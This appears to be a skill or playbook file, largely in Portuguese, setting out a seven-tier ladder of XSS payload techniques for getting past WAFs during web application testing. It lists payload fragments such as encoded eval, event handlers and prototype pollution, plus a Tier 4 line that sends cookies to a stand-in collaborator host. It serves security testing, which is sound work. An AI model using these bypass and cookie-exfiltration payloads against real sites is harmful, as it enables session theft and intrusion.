---
name: xss-detection-ladder
description: >-
  7-tier detection token rotation ladder for XSS testing. Cada tier
  representa um nivel de sofisticacao de bypass. Subir de tier a cada
  3 tentativas sem execucao. Inclui matrix de exaustao e WAF bypass ladder.
domain: web-application-security
subdomain: xss
tags: [xss, detection, payloads, waf-bypass, cross-site-scripting]
mitre_attack: [T1059.007]
nist_csf: [DE.CM-01]
mitre_atlas: [AML.T0047]
version: "1.0"
author: Jaizz Noir
license: Apache-2.0
---

## When to Use
Ao testar XSS em qualquer aplicacao web. Ativar quando:
- Testes baseline com alert(1) sao bloqueados por WAF
- Contexto de insercao nao e HTML direto (JS string, atributo, template)
- Apos 3 tentativas sem execucao de javascript

## Prerequisites
- Navegador ou headless browser para verificar execucao
- Colaborador / request bin para confirmar exfiltracao (Tier 4+)
- Conhecimento do contexto de renderizacao (HTML, JS, URL, CSS)

## Workflow
1. Identificar ponto de insercao (parametro, header, body, fragment)
2. Iniciar no Tier 1 — se WAF bloquear, subir
3. Para cada tier, testar no minimo 3 variacoes
4. Ao encontrar execucao, verificar impacto real (nao apenas alert)
5. Documentar qual tier e tecnica funcionaram

### Tiers de Detection
| Tier | Tecnica | Exemplo |
|------|---------|---------|
| 1 | Basic | alert(1), prompt(1) |
| 2 | Encoded | String.fromCharCode, eval(atob()) |
| 3 | Event Handlers | onerror, onload, ontoggle |
| 4 | Fetch/Exfil | fetch(COLLABORATOR?cookie=) |
| 5 | Parser Differentials | mXSS, namespace confusion |
| 6 | DOM Clobbering | anchor/form clobbering |
| 7 | Prototype Pollution | __proto__[innerHTML] |

### Matrix de Exaustao
Combinacao minima: 5 vetores x 3 encodings x 2 bypasses = 30 tentativas

## Verification
- Payload executa no navegador sem erro de console?
- Exfiltracao chega ao colaborador?
- Funciona em diferentes navegadores (Chrome, Firefox, Safari)?
- CSP permite a execucao?
